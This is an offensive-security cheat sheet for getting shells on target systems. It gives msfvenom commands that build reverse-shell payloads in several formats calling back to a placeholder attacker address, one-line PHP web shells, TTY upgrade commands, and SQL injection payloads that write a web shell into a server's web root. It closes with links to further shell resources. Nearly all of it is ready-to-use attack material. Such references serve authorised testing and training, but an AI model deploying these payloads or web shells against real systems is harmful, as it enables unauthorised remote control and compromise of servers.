# Shells 

Set your Netcat listening shell on an allowed port
Use a port that is likely allowed via outbound firewall rules on the target network, e.g. 80 / 443

# Msfvenom
#Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f elf > shell.elf
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.php
# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f asp > shell.asp
# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f war > shell.war
# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.jsp
# Exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=445 -f exe -o shell_reverse.exe

# Interactive TTY Shell
# python
python -c 'import pty; pty.spawn("/bin/sh")'
# Echo
echo 'os.system('/bin/bash')'
# sh
/bin/sh -i
# bash
/bin/bash -i

# PHP
<?php system($_GET["cmd"]); ?>
<?php echo shell_exec($_GET["cmd"]); ?>




# Shell From SQL Injection
# windows
?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
# linux
?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'




# Other Reverse Shell references
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://resources.infosecinstitute.com/icmp-reverse-shell/#gref

https://highon.coffee/blog/reverse-shell-cheat-sheet/

http://pentestmonkey.net/tools/web-shells/php-reverse-shell

http://pentestmonkey.net/tools/web-shells/perl-reverse-shell

https://github.com/BlackArch/webshells

https://github.com/tennc/webshell/tree/master/php/b374k

https://github.com/tennc/webshell/tree/master/php/PHPshell/c99shell

http://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/

http://securityweekly.com/2011/10/23/python-one-line-shell-code/
